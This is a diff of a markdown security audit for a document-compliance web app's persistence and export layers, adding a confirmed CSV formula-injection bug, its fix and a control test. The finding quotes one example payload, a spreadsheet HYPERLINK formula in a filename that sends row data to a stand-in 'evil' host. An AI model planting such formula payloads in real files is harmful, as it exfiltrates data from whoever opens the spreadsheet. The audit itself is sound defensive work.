@@ -4,7 +4,14 @@ Adversarial audit of the persistence layer and the file pipeline end to end — 
 **corrupt** rather than crash. Method (per epic #235): each class gets a written verdict — a disproof
 (SAFE) citing the exact code path, or a finding → fix / ticket.
 
-## Result: 1 confirmed bug (fixed in this PR with the prescribed control test); everything else SAFE / acceptable.
+## Result: 2 confirmed bugs (both fixed in this PR with control tests); everything else SAFE / acceptable.
+
+> **Review note (this PR's careful-review pass).** The 5-agent review confirmed every SAFE verdict and
+> the audit-bloat fix, and caught a second bug this audit's first draft missed: **CSV formula injection**
+> in the export (class 6) — `BuildCsvAsync` wrote user/vendor-controlled fields with CsvHelper's
+> injection protection at its `None` default, so a `=`-leading uploaded filename (the PUBLIC portal
+> stores it raw) executes as a formula in the org's spreadsheet. **Fixed here** (`InjectionOptions.Escape`
+> + control test). The first draft reasoned only about the PDF renderer and missed the spreadsheet sink.
 
 | # | Class | Verdict | Evidence / fix |
 |---|---|---|---|
@@ -13,7 +20,7 @@ Adversarial audit of the persistence layer and the file pipeline end to end — 
 | 3 | Soft-delete: vendor delete cascade | SAFE / acceptable | links deactivated + vendor soft-deleted atomically (#269); documents survive as independent compliance artifacts with intact referential integrity (the soft-deleted vendor renders "—") — a product choice, not corruption |
 | 4 | Audit completeness: `ExecuteUpdate`/`ExecuteDelete`/raw-SQL bypass | SAFE | every bypass site is background/system (sweep, cost, Resend status), a non-audited entity, or explicitly audited (`vendorPortalLink.deactivated_on_vendor_delete`); user-facing audited mutations go through tracked `SaveChanges` |
 | 5 | File pipeline: validation, transcode, bad files | SAFE | magic-byte validation (8-byte floor rejects zero-byte), HEIC→JPEG transcode is bomb-guarded and fails to a 400 **before** any blob write (#220); corrupt/encrypted PDFs pass magic bytes then fail extraction visibly (terminal `Failed`) |
-| 6 | Export integrity over hostile files | SAFE | exports are **generated metadata reports** (QuestPDF/CSV from DB rows) — they never download or embed the uploaded blobs, so a hostile/corrupt/password-protected/huge file cannot affect an export; audit truncation is **disclosed** (cap 500, #197), not silent |
+| 6 | Export integrity over hostile files | SAFE (no blob merge) **+ BUG → FIXED HERE** (CSV formula injection) | exports are **generated metadata reports** (never embed uploaded blobs → a hostile file can't corrupt them; truncation disclosed, cap 500, #197). But the CSV wrote user/vendor strings unescaped — `=`-leading filename = spreadsheet formula injection across the vendor→customer boundary. Fixed: `InjectionOptions.Escape` + control test |
 | 7 | Migrations: drift guard + destructive migrations | SAFE / scoped | startup auto-migrate + drift guard (ADR 0016, #227) catches "assembly migrations not applied" (the #226 outage) and fail-fasts; snapshot↔schema sync pinned by `DatabaseMigratorIntegrationTests`. Manual-drift / destructive-migration detection is out of scope by design (accepted) |
 | 8 | Verdict input consistency (single-writer) | SAFE | `UpdateFields` writes `ExtractionFields` + typed columns + JSON mirror in ONE `SaveChanges`, then re-evaluates — a single writer's persisted result is internally consistent (the manual-edit-vs-extraction RACE is the concurrency audit's, filed as #337) |
 
@@ -73,6 +80,9 @@ a silently-unaudited *user-facing* mutation of an audited entity:
 - **Explicitly audited:** `VendorPortalEndpoints` and `VendorEndpoints.DeleteVendor` write an explicit
   `vendorPortalLink.deactivated…` `IAuditLogger` row precisely because `ExecuteUpdate` skips the
   interceptor (the code comments call this out); the parent vendor soft-delete is interceptor-audited.
+  `ComplianceEndpoints.DeleteTemplate` follows the identical pattern: its `ExecuteUpdate` clears
+  `Vendor.ComplianceTemplateId` across the affected vendors and writes an explicit
+  `vendor.template_cleared_on_template_delete` row, so that bypass also keeps its trail.
 - **Sub-entity cascade:** `SampleEndpoints` link deactivation rides the audited sample clear; `DeleteRule`'s
   `DELETE … RETURNING` is scoped through the filtered parent template (tenant-safe per #242).
 No user-facing audited-entity mutation loses its trail. `AuditLog` rows are org-stamped (the interceptor
@@ -105,7 +115,28 @@ vendor names) render as literal PDF text (QuestPDF, not markup) → no injection
 point-in-time DB read with a deterministic `OrderBy`; the audit slice is capped at 500 with the cap
 **disclosed** in the caption (`Showing the 500 most recent…`, #197) rather than silently truncated, and
 fetches `cap + 1` to detect truncation. The verdict is date-overlaid at generation time (#257) so an export
-never certifies a stale-Compliant expired doc. SAFE.
+never certifies a stale-Compliant expired doc. SAFE on the hostile-file-merge axis.
+
+**CSV formula injection (FIXED HERE — review finding).** The structural "no blob merge" safety above does
+NOT cover the *content* of the metadata cells. `BuildCsvAsync` wrote `OriginalFileName`, `Vendor.Name`, and
+`UploadedBy` verbatim, and CsvHelper defaults `InjectionOptions` to `None` — so a value beginning `=`, `+`,
+`-`, `@`, TAB, or CR was written raw. The strongest vector is the **PUBLIC vendor portal**: it stores the
+uploaded `OriginalFileName` raw (`SanitizeFileName` is applied only to the blob name, not the stored display
+name), so an untrusted vendor uploads a file named e.g. `=HYPERLINK("http://evil?"&A2,"open")` and, when the
+org owner exports `/api/export/csv` and opens it in Excel/Sheets, the formula executes / exfiltrates the row
+— a stored injection across the vendor→customer trust boundary. The first audit draft reasoned only about the
+QuestPDF text sink (literal, safe) and missed the spreadsheet sink. **Fixed** by setting
+`InjectionOptions.Escape` on the `CsvConfiguration` (prefixes the injection-escape character so the cell
+renders as literal text), pinned by `ExportEndpointsTests.Csv_export_neutralizes_spreadsheet_formula_injection_in_the_filename`.
+(PDF/email sinks were already safe: QuestPDF renders literal text; reminder emails `HtmlEncode`. Boundary
+hardening of the stored `OriginalFileName` itself is left to cleanup epic #41 — the CSV escape closes the
+live sink.)
+
+**Perf observation (not a regression; → #41).** `BuildAuditReportAsync`/`BuildCsvAsync` load the FULL
+`Document` entity (incl. the ~20 KB `ExtractionRawJson` + the `ExtractionFields` jsonb) for every org doc to
+render ~6 scalar columns — ~20 MB+ into memory per export at 1000+ docs/org. It predates this branch and
+exports are manual/infrequent, so per the epic's "production changes only as confirmed-bug fixes" rule it is
+left to the simplification epic #41 (project to the needed scalars, as `ListVendors`/`GetVendor` already do).
 
 ## 7. Migrations — drift guard & destructive migrations
 
@@ -130,8 +161,14 @@ concurrency audit; HERE the single-writer persisted result is internally consist
 
 ## Tests
 
-The fix (class 1) ships with its control test
-(`DocumentEndpointsTests.Document_update_audit_omits_the_raw_extraction_payload_but_keeps_the_meaningful_fields`).
+Both fixes ship with control tests:
+- class 1 (audit bloat): `DocumentEndpointsTests.Document_update_audit_omits_the_raw_extraction_payload_but_keeps_the_meaningful_fields`
+  — asserts the raw payload is absent from Before/After, the meaningful columns survive, AND the combined
+  audit JSON stays under a size bound (a regression net for any future large string column).
+- class 6 (CSV injection): `ExportEndpointsTests.Csv_export_neutralizes_spreadsheet_formula_injection_in_the_filename`
+  — a `=`-leading filename survives in the CSV but never starts a cell as a raw formula (would fail under
+  the prior `InjectionOptions=None` default).
+
 The other verdicts rest on existing coverage, confirmed present: `AccountManagementTests` (email scrub +
 PasswordHash redaction + GDPR export), `VendorEndpointsTests` (delete cascade + portal-link deactivation
 audit), `FileValidationServiceTests` + `ImageTranscoderTests` (bad-file corpus, bomb guard),
